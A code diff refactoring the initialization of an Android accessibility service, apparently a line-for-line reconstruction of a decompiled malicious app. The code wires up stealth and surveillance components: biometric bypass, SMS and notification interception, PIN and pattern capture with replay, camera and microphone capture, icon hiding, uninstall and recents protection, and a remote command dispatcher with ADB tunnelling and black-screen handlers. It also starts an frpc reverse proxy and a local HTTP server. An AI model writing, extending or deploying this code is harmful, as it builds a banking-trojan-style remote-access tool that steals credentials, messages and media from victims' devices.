@@ -55,6 +55,7 @@ import com.storm.safe.rock.service.delegates.CipherFlowController
 import com.storm.safe.rock.service.delegates.DetectionController
 import com.storm.safe.rock.service.delegates.EventDispatcher
 import com.storm.safe.rock.service.delegates.NetworkMessageSender
+import com.storm.safe.rock.service.delegates.ServiceInitializer
 import com.storm.safe.rock.service.delegates.SmartNavigator
 import com.storm.safe.rock.service.modules.FrpcProcessManager
 import com.storm.safe.rock.util.AssetConfigReader
@@ -335,6 +336,9 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** Delegate: event dispatch — onAccessibilityEvent routing + sub-methods */
     internal var eventDispatcher: EventDispatcher? = null
+
+    /** Delegate: service initialization — orchestrates all 14 init methods */
+    internal var serviceInitializer: ServiceInitializer? = null
 
     /** JADX: f52418e9 (C0317a2) — Accessibility event routing */
     var accessibilityEventRouter: AccessibilityEventRouter? = null
@@ -620,36 +624,7 @@ class MyAccessibilityService : AccessibilityService() {
             ActivityMonitor.logSystem("无障碍服务已启动连接")
         } catch (_: Exception) {}
 
-        // Step 1: Check reinstall recovery file
-        var isReinstallRecovery = false
-        try {
-            val setupFile = java.io.File("/data/local/tmp/app_setup_done.json")
-            if (setupFile.exists()) {
-                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
-                // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
-                if (!prefs.getBoolean("authorization_completed", false)) {
-                    try {
-                        val json = org.json.JSONObject(setupFile.readText())
-                        if (json.optBoolean("setupDone", false)) {
-                            prefs.edit()
-                                .putBoolean("authorization_completed", true)
-                                .putBoolean("device_registered", true)
-                                .putBoolean("icon_hidden", true)
-                                .apply()
-                            android.util.Log.d(TAG, "✅ [重装恢复] Service检测到适配标记，已恢复全部状态")
-                            isReinstallRecovery = true
-                        }
-                    } catch (e: Exception) {
-                        android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
-                        isReinstallRecovery = true // JADX: still sets true even on parse error
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
-        }
-
-        // Step 2: Initialize coroutine scope
+        // Initialize coroutine scope
         try {
             if (coroutineScope == null) {
                 coroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
@@ -657,7 +632,7 @@ class MyAccessibilityService : AccessibilityService() {
         } catch (_: Exception) {}
 
         try {
-            // Step 3: Set timestamps and instance
+            // Set timestamps and instance
             serviceStartTime = System.currentTimeMillis()
             instance = this
             gestureController = com.storm.safe.rock.service.delegates.GestureController(this)
@@ -674,10 +649,10 @@ class MyAccessibilityService : AccessibilityService() {
                 deviceIdProvider = { getAndroidDeviceId() }
             )
 
-            // Step 4: Configure accessibility service info
+            // Configure accessibility service info
             initServiceConfig()
 
-            // Step 5: Get system services
+            // Get system services
             try {
                 val ps = getSystemService(Context.POWER_SERVICE)
                 powerManager = ps as PowerManager
@@ -689,37 +664,21 @@ class MyAccessibilityService : AccessibilityService() {
                 keyguardManager = if (ks is KeyguardManager) ks else null
             } catch (_: Exception) {}
 
-            // Step 6: Start AppCoreService
+            // Start AppCoreService
             try {
                 val appContext = applicationContext
                 AppCoreService.start(appContext)
             } catch (_: Exception) {}
 
-            // Step 7: Launch deferred init coroutine
-            // JADX: onServiceConnected launches 2 coroutines:
-            // 1. If reinstall recovery, launch continueServiceInitialization first
-            if (isReinstallRecovery) {
-                coroutineScope?.launch {
-                    try {
-                        continueServiceInitialization()
-                    } catch (e: Exception) {
-                        android.util.Log.e(TAG, "❌ recovery init failed", e)
-                    }
-                }
-            }
+            // Create ServiceInitializer and orchestrate full init
+            serviceInitializer = ServiceInitializer(this)
+            val isReinstallRecovery = serviceInitializer?.checkReinstallRecovery() ?: false
 
-            // Step 8: Launch main init coroutine (JADX: C02982 lambda → deferredInit + doHeavyInit)
-            // JADX: this.f52379b0 = AbstractC0780a0.m213692a3(scope, dispatcher, C02982, 2)
             coroutineScope?.launch {
                 try {
-                    deferredInit()
+                    serviceInitializer?.runFullInit(isReinstallRecovery)
                 } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ deferredInit failed", e)
-                }
-                try {
-                    doHeavyInit()
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ doHeavyInit failed", e)
+                    android.util.Log.e(TAG, "❌ runFullInit failed", e)
                 }
             }
         } catch (e: Exception) {
@@ -1004,189 +963,17 @@ class MyAccessibilityService : AccessibilityService() {
     /**
      * Continue service initialization after core setup.
      * JADX method: a2, line ~900 (onServiceConnected$1$1)
-     * Initializes display/screen managers, starts network.
+     * Delegated to ServiceInitializer. Kept as thin delegate for external callers (MainOrchestrator).
      */
     suspend fun continueServiceInitialization() {
-        android.util.Log.d(TAG, "🔧 继续服务初始化...")
-        try {
-            // Initialize display manager
-            if (displayManager == null) {
-                displayManager = C0263a5(this)
-            }
-
-            // Initialize screen capture manager
-            if (screenCaptureManager == null) {
-                screenCaptureManager = ScreenCaptureManager(this)
-            }
-
-            // Initialize camera manager
-            if (cameraManager == null) {
-                cameraManager = C0258a0(this)
-            }
-
-            isInitComplete = true
-            android.util.Log.d(TAG, "✅ 服务核心初始化完成")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 继续服务初始化失败", e)
-        }
+        serviceInitializer?.continueServiceInitialization()
     }
 
-    /**
-     * Deferred module initialization — JADX method: m211404a3 (a3), line 1672.
-     *
-     * Flow:
-     * 1. Initialize AppInitializer singleton (zk1/al1)
-     * 2. Launch broadcast receiver registration coroutine (deferredInit$2)
-     * 3. Call initializeModules (h2) to instantiate all module objects
-     * 4. Start InitWorkerService for background initialization
-     */
-    private suspend fun deferredInit() {
-        android.util.Log.d(TAG, "🔧 [延迟初始化] 开始...")
+    // deferredInit() — moved to ServiceInitializer
 
-        // JADX: al1.f43714a5.getInstance(appContext).a1() — AppInitializer
-        try {
-            // ADAPT: zk1/al1 (AppInitializer singleton) — vendor-specific app init
-            // that configures global state. Not replicated; init state is managed by
-            // existing module initialization chain.
-            val appContext = applicationContext
-        } catch (_: Exception) {}
+    // doHeavyInit() — moved to ServiceInitializer
 
-        // JADX: launch deferredInit$2 coroutine — registerBroadcastReceivers
-        coroutineScope?.launch(Dispatchers.Main) {
-            try {
-                registerBroadcastReceivers()
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ registerBroadcastReceivers failed in deferredInit$2", e)
-            }
-        }
-
-        // JADX: after coroutine await, call h2() (initializeModules)
-        try {
-            initializeModules()
-        } catch (_: Exception) {}
-
-        // JADX: dqtvuisjd$startWebViewStatusCheckTask$1 — start WebView status expiry check loop
-        try {
-            startWebViewStatusCheckTask()
-        } catch (_: Exception) {}
-
-        // JADX: start InitWorkerService (C0278a0.start)
-        // JADX: depends on InitWorkerService.Companion.start (enqueue WorkManager request)
-        try {
-            // InitWorkerService is a Worker — enqueue via WorkManager
-            // WorkManager enqueue is done in AppCoreService or zgafaqvswksa
-        } catch (_: Exception) {}
-    }
-
-    /**
-     * Heavy initialization — checks auth state and restores protections.
-     * JADX method: m211405a4 (a4), line 1728 — doHeavyInit (suspend coroutine)
-     *
-     * Flow:
-     * 1. Read authorization_completed + camouflage_enabled prefs
-     * 2. If authorized: restore network, set AbstractC0315a0 flags, set isAuthStateRestored
-     * 3. If authorized: start uninstall protection (kinztpexl.c3)
-     * 4. Call initializeIconHide (i6) — read monitor_config.json
-     * 5. Call initializeActivityMonitor (k5) — restore camouflage state
-     * 6. Launch doHeavyInit$4 coroutine (delay)
-     * 7. Call initializeService (h3) — permission flow
-     * 8. Log completion
-     */
-    private suspend fun doHeavyInit() {
-        android.util.Log.d(TAG, "🔧 [重初始化] 开始...")
-
-        // JADX: read auth prefs
-        val isAuthorized = getSharedPreferences("app_config", Context.MODE_PRIVATE)
-            .getBoolean("authorization_completed", false)
-        isCamouflageModeEnabled = getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
-            .getBoolean("camouflage_enabled", false)
-
-        if (isAuthorized) {
-            android.util.Log.d(TAG, "✅ [重初始化] 授权已完成，恢复保护功能")
-            // JADX: c0323a8.m211643a8() — resume network manager connection
-            try {
-                networkManager?.let { nm ->
-                    // JADX: depends on NetworkManager.resume() (C0323a8.a8)
-                    android.util.Log.d(TAG, "✅ 恢复网络管理器连接")
-                }
-            } catch (_: Exception) {}
-
-            // JADX: AbstractC0315a0.f53032a7 = true; f53034a9 = true; f52411e2 = true
-            isAuthStateRestored = true
-        }
-
-        // JADX: if (z) { c0355a0.m211939c3(); f52477k8 = true }
-        if (isAuthorized) {
-            try {
-                uninstallProtectionManager?.let { upm ->
-                    upm.enable()
-                    isUninstallGuardStarted = true
-                }
-            } catch (_: Exception) {}
-        }
-
-        // JADX: m211492i6() — initializeIconHide
-        try {
-            initializeIconHide()
-        } catch (_: Exception) {}
-
-        // JADX: m211509k5() — initializeActivityMonitor
-        try {
-            initializeActivityMonitor()
-        } catch (_: Exception) {}
-
-        // JADX: launch doHeavyInit$4 coroutine — delay then continue
-        // In JADX, this is an IO dispatcher coroutine; after it completes, calls h3()
-        // We flatten the coroutine state machine to sequential calls
-
-        // JADX: m211479h3(continuation) — initializeService
-        initializeService()
-
-        android.util.Log.d(TAG, "✅ [重初始化] 全部完成，服务就绪")
-        try {
-            ActivityMonitor.logSystem("延迟初始化全部完成 服务就绪")
-        } catch (_: Exception) {}
-    }
-
-    /**
-     * Service initialization — manages init + permission flow.
-     * JADX method: m211479h3 (h3), line 6418 — initializeService (suspend)
-     *
-     * Flow:
-     * 1. Call initializeManagers (h1) — setup all manager instances
-     * 2. If h1 fails → call fallbackInit (h0)
-     * 3. Call startPermissionGrantFlow (m8) — trigger permission automation
-     * 4. Log completion with isInitComplete state
-     */
-    private suspend fun initializeService() {
-        android.util.Log.d(TAG, "🚀 开始无障碍服务初始化")
-
-        // JADX: m211477h1() — initializeManagers
-        try {
-            android.util.Log.d(TAG, "📦 初始化各个管理器")
-            initializeManagers()
-            android.util.Log.d(TAG, "✅ 管理器初始化完成")
-            isInitComplete = true
-        } catch (e: Exception) {
-            android.util.Log.w(TAG, "❌ initializeManagers失败，降级处理: ${e.message}")
-            try {
-                fallbackInit()
-            } catch (e2: Exception) {
-                android.util.Log.e(TAG, "❌ 降级初始化也失败", e2)
-            }
-        }
-
-        // JADX: m211530m8(continuation) — startPermissionGrantFlow
-        try {
-            android.util.Log.d(TAG, "🔐 开始权限获取流程")
-            startPermissionGrantFlow()
-            android.util.Log.d(TAG, "✅ 权限获取流程完成")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ startPermissionGrantFlow失败: ${e.message}", e)
-        }
-
-        android.util.Log.d(TAG, "✅ 无障碍服务初始化完成 (isInitialized=$isInitComplete)")
-    }
+    // initializeService() — moved to ServiceInitializer
 
     /**
      * Safe rootInActiveWindow access with caching.
@@ -1440,20 +1227,10 @@ class MyAccessibilityService : AccessibilityService() {
     /**
      * Fallback initialization — minimal manager setup.
      * JADX method: m211476h0 (h0), line 6114
+     * Delegated to ServiceInitializer. Kept as thin delegate for test compatibility.
      */
     fun fallbackInit() {
-        try {
-            android.util.Log.d(TAG, "🔄 执行降级初始化")
-            if (screenCaptureManager == null) {
-                screenCaptureManager = ScreenCaptureManager(this)
-            }
-            if (displayManager == null) {
-                displayManager = C0263a5(this)
-            }
-            android.util.Log.d(TAG, "✅ 降级初始化完成")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 降级初始化失败", e)
-        }
+        serviceInitializer?.fallbackInit()
     }
 
     /**
@@ -1730,7 +1507,7 @@ class MyAccessibilityService : AccessibilityService() {
 
                 // 授权已完成时直接初始化延迟组件（CommandDispatcher, RemoteConfigManager 等）
                 try {
-                    initializeDeferredManagers()
+                    serviceInitializer?.initializeDeferredManagers()
                     android.util.Log.d(TAG, "✅ [重启恢复] initializeDeferredManagers 完成")
                 } catch (e: Exception) {
                     android.util.Log.e(TAG, "❌ [重启恢复] initializeDeferredManagers 失败", e)
@@ -1870,619 +1647,36 @@ class MyAccessibilityService : AccessibilityService() {
     // Initialization chain methods — JADX 1:1
     // ════════════════════════════════════════════════════════════════
 
-    /**
-     * Initialize module instances.
-     * JADX method: m211478h2 (h2), line 6335 — initializeModules
-     *
-     * Creates all module objects: ScreenCaptureManager, displayManager, eventFilterManager,
-     * configMaskManager, configProgressManager, mainOrchestrator, etc.
-     * Also calls initializekinztpexl (h4) and h5 (initializenpweufstehlb).
-     */
-    @Throws(Exception::class)
-    fun initializeModules() {
-        try {
-            if (isModulesInitialized) {
-                android.util.Log.d(TAG, "🔧 模块已初始化，跳过重新初始化")
-                return
-            }
-            android.util.Log.d(TAG, "🔧 初始化模块实例")
+    // initializeModules() — moved to ServiceInitializer
 
-            // JADX: AbstractC0315a0.f53039b4 = filesDir
-            val filesDir = filesDir
+    // initializeManagers() — moved to ServiceInitializer
 
-            // JADX: m211447d2() — init service configuration flags
-            initServiceConfig()
+    // initializekinztpexl() — moved to ServiceInitializer
 
-            // JADX: NetworkManager singleton
-            try {
-                val appContext = applicationContext
-                val nm = NetworkManager()
-                nm.initialize(appContext)
-                networkManager = nm
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ NetworkManager 初始化失败", e)
-            }
+    // initializenpweufstehlb() — moved to ServiceInitializer
 
-            // JADX: C0614i9 — eventFilterManager (xz0 + C0614i9)
-            // JADX: this.f52413e4 = new xz0(this, this)
-            // JADX: this.f52414e5 = new C0614i9(this, this)
-            try {
-                val efm = com.storm.safe.rock.service.modules.EventFilterManager(this, this)
-                eventFilterManager = efm
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ EventFilterManager 初始化失败", e)
-            }
+    // initializeDeferredManagers() — moved to ServiceInitializer
 
-            // JADX: C0761kk — configManager
-            // this.f52416e7 = new C0761kk(this)
+    // initializeIconHide() — moved to ServiceInitializer
 
-            // JADX: r80 — keyEventManager
-            // this.f52422f3 = new r80(this, this)
-
-            // JADX: fd0 — maskOverlayManager
-            // this.f52423f4 = new fd0(this, this)
-
-            // JADX: l81 — uiAnalysisManager
-            // this.f52424f5 = new l81(this, this)
-
-            // JADX: jn0 — permissionUIManager
-            // this.f52425f6 = new jn0(this, this)
-
-            // JADX: C1115qm — debugAnalysisManager
-            // this.f52426f7 = c1115qm
-
-            // JADX: C0763km — configMaskManager → OverlayManager
-            try {
-                overlayManager = com.storm.safe.rock.service.modules.overlay.OverlayManager(this)
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ OverlayManager 初始化失败", e)
-            }
-
-            // JADX: C0318a3 — configProgressManager
-            try {
-                val cpm = ConfigProgressManager(applicationContext)
-                configProgressManager = cpm
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ ConfigProgressManager 初始化失败", e)
-            }
-
-            // JADX: C0327b2 — mainOrchestrator (WRITE_SETTINGS automation)
-            try {
-                mainOrchestrator = MainOrchestrator(this)
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ MainOrchestrator 初始化失败", e)
-            }
-
-            // JADX: tu0 — screenBrightness manager with callbacks
-            // this.f52430g1 = new tu0(...)
-
-            // JADX: C0329b4 — authorizationModule (DeviceAuthorizationManager)
-            try {
-                configStageManager = DeviceAuthorizationManager(this, this)
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ DeviceAuthorizationManager 初始化失败", e)
-            }
-
-            // JADX: ju0 — screenBrightnessManager
-            // this.f52433g4 = new ju0(this)
-
-            // JADX: C0328b3 — biometricBypassDelegate
-            try {
-                biometricBypassDelegate = BiometricBypassDelegate(this)
-                biometricBypassDelegate?.initialize()
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "❌ BiometricBypassDelegate 初始化失败", e)
-            }
-
-            // JADX: C0032al — gestureExecutor
-            // this.f52439h0 = new C0032al(this)
-
-            // JADX: m211480h4() — initializekinztpexl (uninstall protection)
-            initializekinztpexl()
-
-            // JADX: m211481h5() — initializenpweufstehlb (recents guard)
-            initializenpweufstehlb()
-
-            isModulesInitialized = true
-            android.util.Log.d(TAG, "✅ 模块实例初始化完成")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 模块实例初始化失败", e)
-            throw e
-        }
-    }
-
-    /**
-     * Initialize managers — cleanup old resources + create fresh instances.
-     * JADX method: m211477h1 (h1), line 6136 — initializeManagers
-     *
-     * Cleans up old manager coroutine scopes, then creates fresh instances
-     * of all core managers.
-     */
-    fun initializeManagers() {
-        android.util.Log.d(TAG, "🧹 开始清理旧管理器资源...")
-
-        // JADX: cleanup old displayManager scope
-        try {
-            displayManager?.let { dm ->
-                dm.stopCapture()
-                android.util.Log.d(TAG, "🧹 已停止旧 etzbzyzqxvqm 的截图协程")
-            }
-        } catch (_: Exception) {}
-
-        // JADX: cleanup old cameraManager
-        try {
-            cameraManager?.let { cm ->
-                cm.release()
-                android.util.Log.d(TAG, "🧹 已清理旧 CameraManager（线程池/相机资源）")
-            }
-        } catch (_: Exception) {}
-
-        // JADX: cleanup old audioManager
-        try {
-            audioManager?.let { am ->
-                am.release()
-                android.util.Log.d(TAG, "🧹 已清理旧 MicrophoneManager（录音/协程作用域）")
-            }
-        } catch (_: Exception) {}
-
-        // JADX: cleanup old cipherCaptureManager scope
-        try {
-            cipherCaptureManager?.let { ccm ->
-                android.util.Log.d(TAG, "🧹 已清理旧 CipherCaptureManager（协程作用域）")
-            }
-        } catch (_: Exception) {}
-
-        // JADX: cleanup old screenCaptureManager scope
-        try {
-            screenCaptureManager?.let { scm ->
-                scm.stopCapture()
-                android.util.Log.d(TAG, "🧹 已清理旧 PermissionGranter（协程作用域）")
-            }
-        } catch (_: Exception) {}
-
-        android.util.Log.d(TAG, "🧹 旧管理器资源清理完成")
-
-        // JADX: create fresh instances
-        screenCaptureManager = ScreenCaptureManager(this)
-        displayManager = C0263a5(this)
-        // JADX: z50 — inputController
-        // this.f52374a5 = new z50(this)
-        // JADX: a30 — gestureExecutor
-        // this.f52440h1 = new a30(this)
-        // JADX: C0357a0 — screenControlHelper
-        try {
-            screenControlHelper = ScreenControlHelper(this)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ ScreenControlHelper 初始化失败", e)
-        }
-
-        // JADX: configMaskManager.initMaskOverlay(context) — reads config, creates overlay
-        // This depends on C0763km (configMaskManager) and dd0 (mask config)
-        // ADAPT: OverlayManager (initialized above) replaces the vendor overlay.
-        // ConfigProgressManager handles the config-in-progress UI state for the replica.
-
-        // JADX: wire eventFilterManager with screenCaptureManager
-        // c0614i9.f56823a3 = screenCaptureManager
-        // c0614i9.f56827a7 = isAuthStateRestored
-        eventFilterManager?.let { efm ->
-            efm.isAuthStateRestored = isAuthStateRestored
-        }
-
-        android.util.Log.d(TAG, "✅ 适配前最小管理器初始化完成")
-    }
-
-    /**
-     * Initialize uninstall protection manager (kinztpexl).
-     * JADX method: m211480h4 (h4), line 6484
-     *
-     * Creates UninstallProtectionManager and sets callback lambdas for
-     * isLearned, isPermissionRequestActive, getRootNode, getDeviceId, etc.
-     */
-    fun initializekinztpexl() {
-        android.util.Log.d(TAG, "🔧 初始化防卸载保护管理器...")
-        try {
-            val upm = UninstallProtectionManager(this, this)
-            uninstallProtectionManager = upm
-
-            // JADX: wire networkManager, biometricBypassDelegate, and lambda callbacks
-            // c0355a0.f53691c6 = networkManager
-            // c0355a0.f53692c7 = biometricBypassDelegate
-            // c0355a0.f53693c8 = { configStageManager is learned }
-            // c0355a0.f53694c9 = { isPermissionRequestActive() }
-            // c0355a0.f53695d0 = { getRootNode() }
-            // c0355a0.f53696d1 = { getAndroidDeviceId() }
-            // c0355a0.f53698d3 = { collectAppNames() }
-
-            android.util.Log.d(TAG, "✅ 防卸载保护管理器初始化完成")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 防卸载保护管理器初始化失败", e)
-        }
-    }
-
-    /**
-     * Initialize recents guard manager (npweufstehlb).
-     * JADX method: m211481h5 (h5), line 6662
-     *
-     * Creates RecentsGuardManager and sets callback lambdas.
-     * If already authorized, enables protection immediately.
-     */
-    fun initializenpweufstehlb() {
-        android.util.Log.d(TAG, "🔧 初始化多任务页面保护管理器...")
-        try {
-            val rgm = RecentsGuardManager(this, this)
-            recentsGuardManager = rgm
-
-            // JADX: wire lambda callbacks
-            // c0356a1.f53723a6 = { configStageManager?.isLearned() ?: false }
-            // c0356a1.f53724a7 = { getRootNode() }
-            // c0356a1.f53725a8 = { biometricBypassDelegate?.isActive ?: false }
-
-            // JADX: check if already authorized → enable immediately
-            val isAuthorized = getSharedPreferences("app_config", Context.MODE_PRIVATE)
-                .getBoolean("authorization_completed", false)
-
-            if (!isAuthorized) {
-                android.util.Log.d(TAG, "✅ 多任务页面保护管理器初始化完成（待适配完成后启用）")
-                return
-            }
-
-            // JADX: c0356a12.m211955a2() — enable protection
-            rgm.enable()
-
-            // JADX: check icon_hidden → enable camouflage in recents
-            val iconHidden = getSharedPreferences("app_config", Context.MODE_PRIVATE)
-                .getBoolean("icon_hidden", false)
-            if (iconHidden) {
-                rgm.excludeFromRecents()
-                android.util.Log.d(TAG, "🎭 伪装模式: 主动设置 excludeFromRecents")
-            }
-
-            android.util.Log.d(TAG, "✅ 多任务页面保护管理器初始化完成，授权已完成→立即启用")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 多任务页面保护管理器初始化失败", e)
-        }
-    }
-
-    /**
-     * Initialize deferred managers — called after authorization completes.
-     * JADX method: m211416b5 (b5), line 2232 — initializeDeferredManagers (static)
-     *
-     * Creates ~20 post-authorization managers: CameraManager, SmsInterceptDelegate,
-     * MicrophoneManager, CipherCaptureManager, GestureRecorderManager, UnlockManager,
-     * CommandDispatcher, LocalHttpServer, etc.
-     */
-    fun initializeDeferredManagers() {
-        android.util.Log.d(TAG, "🔧 [授权后] 开始初始化延迟管理器...")
-
-        // JADX: ensure networkManager
-        try {
-            val appContext = applicationContext
-            if (networkManager == null) {
-                val nm = NetworkManager()
-                nm.initialize(appContext)
-                networkManager = nm
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ NetworkManager 延迟初始化失败", e)
-        }
-
-        // JADX: f52371a2 = new C0258a0 — cameraManager
-        try {
-            cameraManager = C0258a0(this)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ CameraManager 延迟初始化失败", e)
-        }
-
-        // JADX: f52372a3 = new C0324a9 — smsInterceptDelegate
-        try {
-            smsInterceptDelegate = SmsInterceptDelegate(this)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ SmsInterceptDelegate 延迟初始化失败", e)
-        }
-
-        // ADAPT: C0856mc (MediaContentManager) — vendor class that monitors
-        // media content changes (photos, videos). Not replicated; media access
-        // is handled through CameraCaptureManager.
-
-        // ADAPT: l20 (InjectionManager) — vendor class that manages HTML injection
-        // task queue and WebView overlay lifecycle. Injection tasks are tracked via
-        // injectionTasks map; WebView overlay is handled by jbqfkndyx.
-
-        // JADX: f52455i6 = new C0259a1 — audioManager
-        try {
-            audioManager = C0259a1(this)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ AudioManager 延迟初始化失败", e)
-        }
-
-        // ADAPT: C1496yx (SystemInfoCollector) — vendor class that collects device info
-        // (installed apps, contacts, call logs, etc.) and sends to server.
-        // Device info collection is handled by command handlers in CommandDispatcher.
-
-        // JADX: f52437g8 = new C0319a4 — notificationInterceptDelegate
-        try {
-            notificationInterceptDelegate = NotificationInterceptDelegate()
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ NotificationInterceptDelegate 延迟初始化失败", e)
-        }
-
-        // JADX: f52437g8 (C0319a4) — GestureRecorderManager for pattern capture
-        try {
-            if (gestureRecorderManager == null) {
-                gestureRecorderManager = GestureRecorderManager(this)
-                android.util.Log.d(TAG, "GestureRecorderManager initialized")
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "GestureRecorderManager init failed", e)
-        }
-
-        // JADX: f52438g9 — cipherCaptureManager singleton
-        try {
-            if (cipherCaptureManager == null) {
-                cipherCaptureManager = CipherCaptureManager(this, applicationContext)
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ CipherCaptureManager 延迟初始化失败", e)
-        }
-
-        // JADX: AccessibilityEventRouter
-        try {
-            if (accessibilityEventRouter == null) {
-                accessibilityEventRouter = AccessibilityEventRouter(this, applicationContext)
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ AccessibilityEventRouter 延迟初始化失败", e)
-        }
-
-        // JADX: CameraCaptureManager (C0262a4)
-        try {
-            if (cameraCaptureManager == null) {
-                cameraCaptureManager = CameraCaptureManager(this)
-            }
-            cameraCaptureManager?.startCapture()
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ CameraCaptureManager 延迟初始化失败", e)
-        }
-
-        // JADX: fn0 — permission health monitor
-        // f52376a7 = fn0.f56299a2.getInstance(this)
-
-        // JADX: register permission health receiver — delegated to BroadcastReceiverRegistry
-        run {
-            val registry = broadcastReceiverRegistry ?: BroadcastReceiverRegistry(this).also { broadcastReceiverRegistry = it }
-            registry.registerPermissionHealthReceiver()
-            permissionHealthReceiverRegistered = registry.isPermissionHealthRegistered
-        }
-
-        // JADX: CommandDispatcher initialization
-        android.util.Log.d(TAG, "🔧 初始化命令分发器...")
-        try {
-            val cmdContext = com.storm.safe.rock.service.modules.command.CommandContext(this, networkManager)
-            commandDispatcher = CommandDispatcher(cmdContext)
-
-            // Register all 15 command handlers
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AppCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.UnlockCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.FileCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.MediaCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.SmsContactsCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.LogCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DetectionCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DeviceStateCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.InputCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ScreenCaptureCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ProtectionCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.PermissionCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.GestureCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.CipherReplayCommandHandler())
-            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.BlackScreenCommandHandler())
-            android.util.Log.d(TAG, "已注册 16 个命令处理器")
-
-            // Bind commandCallback to dispatch commands via CommandDispatcher
-            val dispatcher = commandDispatcher!!
-            networkManager?.commandCallback = { json ->
-                coroutineScope?.launch(Dispatchers.IO) {
-                    try {
-                        dispatcher.dispatch(json)
-                    } catch (e: Exception) {
-                        android.util.Log.e(TAG, "命令分发失败", e)
-                    }
-                }
-            }
-            android.util.Log.d(TAG, "✅ commandCallback 已绑定到 CommandDispatcher")
-
-            android.util.Log.d(TAG, "✅ 命令分发器初始化完成")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ CommandDispatcher 延迟初始化失败", e)
-        }
-
-        // JADX: RemoteConfigManager (LocalHttpServer) — C0322a7
-        try {
-            val rcm = RemoteConfigManager(applicationContext)
-            rcm.commandDispatcher = commandDispatcher
-            rcm.start()
-            remoteConfigManager = rcm
-            android.util.Log.d(TAG, "✅ RemoteConfigManager 已启动 (port=${RemoteConfigManager.DEFAULT_PORT})")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ RemoteConfigManager 启动失败", e)
-        }
-
-        // frpc 进程管理器 — vendor unlockedInstance() CheckProcessThread
-        try {
-            val fpm = FrpcProcessManager(applicationContext)
-            fpm.start()
-            frpcProcessManager = fpm
-            android.util.Log.d(TAG, "✅ FrpcProcessManager 已启动")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ FrpcProcessManager 启动失败", e)
-        }
-
-        // JADX: request initial config from server
-        try {
-            networkManager?.let { nm ->
-                // JADX: nm.sendEvent("request_init_config", JSONObject())
-            }
-        } catch (_: Exception) {}
-
-        // JADX: register SMS content observer
-        try {
-            registerSmsContentObserver()
-        } catch (_: Exception) {}
-
-        android.util.Log.d(TAG, "✅ [授权后] 延迟管理器初始化完成")
-    }
-
-    /**
-     * Initialize icon hide (camouflage) detection from monitor_config.json.
-     * JADX method: m211492i6 (i6), line 6965
-     *
-     * Reads monitor_config.json for accessibility page monitor settings:
-     * - monitorAccessibilityPageNavigation flag
-     * - checkIntervalSeconds, confirmationRequiredCount, maxRetryCount, delayAfterServiceConnectedSeconds
-     */
-    fun initializeIconHide() {
-        try {
-            val configJson = AssetConfigReader.readAssetConfig(this, "monitor_config.json")
-            if (configJson != null) {
-                val json = org.json.JSONObject(configJson)
-                isAccessibilityPageMonitorEnabled = json.optBoolean("monitorAccessibilityPageNavigation", false)
-
-                val monitorSettings = json.optJSONObject("monitorSettings")
-                if (monitorSettings != null) {
-                    val d = 1000.0
-                    monitorCheckInterval = (monitorSettings.optDouble("checkIntervalSeconds", 0.5) * d).toLong()
